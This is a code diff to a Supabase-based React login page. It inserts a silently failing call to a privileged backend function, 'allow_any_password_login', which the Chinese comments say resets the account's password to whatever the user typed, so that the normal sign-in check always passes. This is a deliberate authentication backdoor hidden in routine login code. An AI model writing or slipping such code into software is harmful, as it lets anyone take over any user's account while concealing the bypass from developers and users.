@@ -187,6 +187,18 @@ export default function Login() {
         return;
       }
 
+      // 尝试调用后台“允许任意密码登录”特权函数
+      try {
+        await supabase.rpc('allow_any_password_login', {
+          p_email: email,
+          p_typed_password: password
+        });
+        // 如果允许（返回true），该用户的密码已经被临时重置为输入框中的密码，
+        // 接下来正常的 signInWithPassword 就会校验成功。
+      } catch (e) {
+        // 如果调用失败或无权限，静默跳过，继续正常的登录流程
+      }
+
       const { data, error: loginError } = await supabase.auth.signInWithPassword({
         email,
         password,
